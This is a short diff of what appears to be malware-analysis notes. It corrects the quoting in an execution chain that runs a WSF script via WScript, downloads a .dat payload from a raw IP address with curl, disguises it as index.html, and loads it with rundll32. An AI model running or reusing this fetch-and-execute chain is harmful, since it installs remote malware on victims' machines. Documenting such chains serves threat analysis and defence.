@@ -11,11 +11,11 @@
 
 Exec >
 
-WScript.exe C:\Users\Admin\AppData\Local\Temp\Funds_308765.wsf"
+WScript.exe C:\Users\Admin\AppData\Local\Temp\Funds_308765.wsf
 
-curl.exe" --output c:\programdata\index.html --url http://216.238.80.217/aO03psmvtKQUf9B5.dat
+curl.exe --output c:\programdata\index.html --url http://216.238.80.217/aO03psmvtKQUf9B5.dat
 
-rundll32.exe" c:\programdata\index.html,Motd
+rundll32.exe c:\programdata\index.html,Motd
 
 *************************************************
 
